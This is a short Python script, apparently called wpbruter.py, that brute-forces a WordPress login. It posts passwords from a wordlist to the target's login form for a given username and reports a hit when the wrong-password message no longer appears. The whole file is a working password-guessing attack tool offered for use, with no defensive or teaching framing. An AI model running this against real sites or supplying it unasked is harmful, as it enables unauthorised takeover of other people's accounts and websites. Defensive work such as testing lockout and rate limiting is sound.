import sys
import requests
import threading

pwd = str("0")

if len(sys.argv) not in [4]:
    print('[*] Usage: python wpbruter.py <target> <username> <wordlist>\n')
    sys.exit(1)

if sys.argv[1][:7] != 'http://':
    host = 'http://' + sys.argv[1]
else:
    host = sys.argv[1]

print ('[*] BruteForcing:', host)
print ('[*] Username:', sys.argv[2])

try:
    passwords = [x.strip() for x in open(sys.argv[3], 'r', encoding='latin-1').readlines() if x]
    print ('[*] Total Passwords Loaded:', len(passwords), '\n')

except IOError:
    print('[-] Error: Wordlist Not Found\n')
    sys.exit(1)

def Brute(target, wlist):
    s = requests.Session()
    for number,password in enumerate(passwords):
        fodata = {'log': sys.argv[2],'pwd': password}
        response = s.post(target, data=fodata)
        print("[*] Trying Password#" + str(number) + ": " + password)

        if "The password you entered for the username" not in response.text:
            print()
            print('[+] Password Found: '+ password)
            global pwd
            pwd += str("1")
            sys.exit(0)

try:
    thread = threading.Thread(target = Brute, args = (sys.argv[1], sys.argv[3],))
    thread.start()
    thread.join()

except KeyboardInterrupt:
    print("[-] Aborted")
    sys.exit(0)


if pwd == str("0"):
    print("[-] Password Not Found")
    sys.exit(0)
